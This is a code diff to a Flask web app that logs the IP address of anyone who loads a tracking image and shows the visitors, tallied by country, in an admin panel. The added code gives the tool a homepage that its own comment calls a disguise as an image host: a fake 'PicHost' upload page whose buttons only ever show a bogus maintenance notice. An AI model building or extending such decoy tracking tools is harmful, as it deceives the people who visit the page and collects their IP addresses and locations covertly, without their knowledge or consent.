@@ -45,6 +45,11 @@ def log_ip(ip):
     conn.commit()
     conn.close()
 
+@app.route('/')
+def index():
+    """首页 - 伪装成图床"""
+    return render_template_string(INDEX_HTML)
+
 @app.route('/background.png')
 def background():
     """返回背景图片并记录IP"""
@@ -69,6 +74,61 @@ def admin_panel():
         countries[r[1]] = countries.get(r[1], 0) + 1
 
     return render_template_string(ADMIN_HTML, records=records, total=total, countries=countries)
+
+INDEX_HTML = '''
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PicHost - 免费图床</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
+        .container { background: #fff; padding: 50px; border-radius: 16px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); text-align: center; max-width: 450px; width: 90%; }
+        h1 { color: #333; font-size: 28px; margin-bottom: 10px; }
+        .subtitle { color: #666; margin-bottom: 30px; }
+        .upload-area { border: 2px dashed #ddd; border-radius: 12px; padding: 40px 20px; margin-bottom: 20px; cursor: pointer; transition: all 0.3s; }
+        .upload-area:hover { border-color: #667eea; background: #f8f9ff; }
+        .upload-icon { font-size: 48px; margin-bottom: 15px; }
+        .upload-text { color: #666; }
+        .btn { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: #fff; border: none; padding: 14px 40px; border-radius: 8px; font-size: 16px; cursor: pointer; transition: transform 0.2s, box-shadow 0.2s; }
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 5px 20px rgba(102,126,234,0.4); }
+        .footer { margin-top: 30px; color: #999; font-size: 13px; }
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); align-items: center; justify-content: center; }
+        .modal.active { display: flex; }
+        .modal-content { background: #fff; padding: 40px; border-radius: 12px; text-align: center; max-width: 350px; }
+        .modal-content h2 { color: #e74c3c; margin-bottom: 15px; }
+        .modal-content p { color: #666; margin-bottom: 20px; }
+        .close-btn { background: #eee; color: #333; border: none; padding: 10px 30px; border-radius: 6px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>PicHost</h1>
+        <p class="subtitle">简单、快速、免费的图片托管服务</p>
+        <div class="upload-area" onclick="showMaintenance()">
+            <div class="upload-icon">📷</div>
+            <p class="upload-text">点击或拖拽图片到这里上传</p>
+        </div>
+        <button class="btn" onclick="showMaintenance()">选择图片上传</button>
+        <p class="footer">支持 JPG、PNG、GIF、WebP 格式，单张最大 10MB</p>
+    </div>
+    <div class="modal" id="modal">
+        <div class="modal-content">
+            <h2>⚠️ 系统维护中</h2>
+            <p>上传服务正在升级维护，请稍后再试。预计恢复时间：2小时内</p>
+            <button class="close-btn" onclick="closeModal()">知道了</button>
+        </div>
+    </div>
+    <script>
+        function showMaintenance() { document.getElementById('modal').classList.add('active'); }
+        function closeModal() { document.getElementById('modal').classList.remove('active'); }
+        document.getElementById('modal').addEventListener('click', function(e) { if(e.target === this) closeModal(); });
+    </script>
+</body>
+</html>
+'''
 
 ADMIN_HTML = '''
 <!DOCTYPE html>
